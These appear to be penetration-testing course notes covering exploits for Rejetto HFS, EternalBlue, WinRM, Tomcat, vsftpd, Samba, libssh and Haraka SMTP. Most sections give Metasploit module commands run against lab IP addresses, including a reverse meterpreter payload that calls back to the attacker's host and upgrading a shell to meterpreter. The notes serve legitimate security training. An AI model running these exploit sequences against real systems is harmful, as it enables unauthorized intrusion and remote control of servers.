--- 

# Windows & Linux Exploitation
--- 

## Exploiting A Vulnerable HTTP File Server

Rejetto HFS V2.3 is vulnerable to a remote command execution attack.

## Exploiting Windows MS17-010 SMB Vulnerability

 EternalBlue (MS17-010/CVE-2017-0144) is the name given to a collection of
Windows vulnerabilities and exploits that allow attackers to remotely execute
arbitrary code and gain access to a Windows system and consequently the
network that the target system is a part of.

## Exploiting WinRM (Windows Remote Management Protocol)

+ Windows Remote Management (WinRM) is a Windows remote management protocol that can be used to facilitate remote access with Windows systems.

+ WinRM is typically used in the following ways:
	-  Remotely access and interact with Windows hosts on a local network.
	- Remotely access and execute commands on Windows systems on the internet.
	  - Manage and configure Windows systems remotely.
	  
+ WinRM typically uses TCP port 5985 and 5986 (HTTPS).

+ WinRM implements access control and security for communication between
systems through various forms of authentication.

+ We can utilize the MSF to identify WinRM users and their passwords as well as
execute commands on the target system.

+ We can also utilize a MSF WinRM exploit module to obtain a meterpreter session
on the target system.

> ALL METASPLOIT CODES ARE FOUND IN [[02 - Windows Vulnrabilities]] and [[06 - Linux Vulnerabilities]]


## Exploiting Apache Tomcat

Apache Tomcat, also known as Tomcat server, is a popular, free and open source Java servlet web server.

- It is used to build and host dynamic websites and web applications based on the Java software platform.

- Apache Tomcat utilizes the HTTP protocol to facilitate the underlying communication between the server and clients.

- Apache Tomcat runs on TCP port 8080 by default.


+ The standard Apache HTTP web server is used to host static and dynamic websites or web applications, typically developed in PHP.

+ The Apache Tomcat web server is primarily used to host dynamic websites or web applications developed in Java.

+ Apache Tomcat V8.5.19 is vulnerable to a remote code execution vulnerability that could potentially allow an attacker to upload and execute a JSP payload in order to gain remote access to the target server.

+ We can utilize a prebuilt MSF exploit module to exploit this vulnerability and
consequently gain access to the target server 

``` bash

msf > use exploit/multi/http/tomcat_jsp_upload_bypass

```

## Exploiting FTP

+ FTP (File Transfer Protocol) is a protocol that uses TCP port 21 and is used to
facilitate file sharing between a server and client/clients.

+ It is also frequently used as a means of transferring files to and from the
directory of a web server.

+ vsftpd is an FTP server for Unix-like systems including Linux systems and is
the default FTP server for Ubuntu, CentOS and Fedora.

+ vsftpd V2.3.4 is vulnerable to a command execution vulnerability that is
facilitated by a malicious backdoor that was added to the vsftpd download
archive through a supply chain attack.

``` bash

nmap 192.59.143.3 -sVC -T4 -O -oA nmap

msf5 > use exploit/unix/ftp/vsftpd_234_backdoor
```

## Exploiting Samba

+ SMB (Server Message Block) is a network file sharing protocol that is used to
facilitate the sharing of files and peripherals between computers on a local
network (LAN).

+ SMB uses port 445 (TCP). However, originally, SMB ran on top of NetBIOS using
port 139.

+ Samba is the Linux implementation of SMB, and allows Windows systems to
access Linux shares and devices.

+ Samba V3.5.0 is vulnerable to a remote code execution vulnerability, allowing a
malicious client to upload a shared library to a writable share, and then cause the
server to load and execute it.

``` bash
use exploit/linux/samba/is_known_pipename
```

## Exploiting SSH

SSH (Secure Shell) is a remote administration protocol that offers encryption and is the successor to Telnet.

- It is typically used for remote access to servers and systems. 

- SSH uses TCP port 22 by default, however, like other services, it can be configured to use any other open TCP port.

- libssh is a multiplatform C library implementing the SSHv2 protocol on client and server side.

- libssh V0.6.0-0.8.0 is vulnerable to an authentication bypass vulnerability in the libssh server code that can be exploited to execute commands on the target server. 
```bash

msf > workspace -a ssh
msf > db_nmap 
msf > ip a
msf > db_nmap 192.251.90.3 -sVC -A -T4

msf > search libssh
msf > use auxiliary/scanner/ssh/libssh_auth_bypass
msf > options
msf > set rhosts 192.251.90.3 
msf > set SPAWN_PTY true
msf > run
msf > search shell_to
msf > use post/multi/manage/shell_to_meterpreter
msf > options
msf > set SESSION 1
msf > run
msf > sessions -i 2
```

## Exploiting SMTP

+ SMTP (Simple Mail Transfer Protocol) is a communication protocol that is used
for the transmission of email.

+ SMTP uses TCP port 25 by default. It can also be configured to run on TCP
port 465 and 587.

+ Haraka is an open source high performance SMTP server developed in
Node.js.

+ The Haraka SMTP server comes with a plugin for processing attachments.
Haraka versions prior to V2.8.9 are vulnerable to command injection.

```bash
msf > ip a

msf > db_nmap 192.47.200.3 -sVC -A -T4
msf > search Haraka
msf > use exploit/linux/smtp/haraka
msf > set RHOSTS 192.47.200.3

msf > set SRVPORT 9898
msf > set email_to root@attackdefense.test

msf > set lhost 192.47.200.2

msf > set payload linux/x64/meterpreter_reverse_http
msf > run

```